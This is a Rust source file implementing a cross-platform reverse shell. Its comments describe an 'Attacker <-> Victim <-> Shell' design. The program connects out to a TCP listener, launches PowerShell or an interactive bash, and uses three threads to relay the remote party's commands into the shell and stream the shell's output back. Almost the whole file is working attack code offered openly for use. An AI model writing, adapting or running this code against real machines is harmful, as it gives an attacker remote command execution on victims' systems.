/*
    NOTE: This revshell is cross-platform and doesn't use unsafe code.

    ** Plan to create the P E R F E C T revshell (well, sort of) **

    Attacker <------------> Victim <------------> Shell

    # 3 threads:
    1. Receives commands from "Attacker" and forwards them to the stdin of the shell process ;
        -> Easy because "Attacker" input ends with `\n`
    2. Listens line by line to the `stdout` of "Shell" and forwards to Attacker ;
        -> 'Normally', everything ends with a line in `stdout`
    3. Listens byte by byte to the `stderr` of "Shell" and forwards to Attacker.
        -> No choice but to do byte by byte because the "Shell" doesn’t necessarily send `\n`
        -> e.g., the prompt of the "Shell" does not end with `\n`
*/

use std::io;
use std::thread;
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::io::{BufReader, BufRead, Read, BufWriter, Write};

fn main() -> io::Result<()> {
    // Creation of the tcp connexion with "Attacker"
    let sock = TcpStream::connect("127.0.0.1:7856")?;
    let mut sock_reader = BufReader::new(sock.try_clone()?);
    let mut sock_writer_out = BufWriter::new(sock.try_clone()?);
    let mut sock_writer_err = BufWriter::new(sock);

    // Creation of the shell process
    let mut shell = if cfg!(target_os = "windows") {
        Command::new("powershell.exe")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?
    } else {
        Command::new("bash")
            .arg("-i")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?
    };

    let mut shell_stdout = BufReader::new(shell.stdout.take().unwrap());
    let mut shell_stderr = BufReader::new(shell.stderr.take().unwrap());
    let mut shell_stdin = BufWriter::new(shell.stdin.take().unwrap());

    // Listen commands from "Attacker" and fwd to `shell_stdin`
    let thread_1 = thread::spawn(move || -> io::Result<()> {
        let mut cmd = String::new();
        loop {
            cmd.clear();
            sock_reader.read_line(&mut cmd)?;

            if cmd == "" || cmd.trim() == "exit" {
                // Not sure this exit is clean, open PR/issue if you have better ideas
                shell.kill()?;
                std::process::exit(0);
            }

            shell_stdin.write(cmd.as_bytes())?;
            shell_stdin.flush()?;
        }
    });

    // Listen shell_stdout (line by line) and fwd to `sock_writer_out`
    let thread_2 = thread::spawn(move || -> io::Result<()> {
        let mut res = String::new();

        loop {
            res.clear();
            shell_stdout.read_line(&mut res)?;

            sock_writer_out.write(res.as_bytes())?;
            sock_writer_out.flush()?;
        }
    });

    // Listen from shell_stderr (byte by byte) and fwd to `sock_writer_err`
     let thread_3 = thread::spawn(move || -> io::Result<()> {
        let mut my_byte: [u8 ; 1] = [0 ; 1];

        loop {
            shell_stderr.read(&mut my_byte)?;

            sock_writer_err.write(&my_byte)?;
            sock_writer_err.flush()?;
        }
    });

    let _ = thread_1.join();
    let _ = thread_2.join();
    let _ = thread_3.join();

    Ok(())
}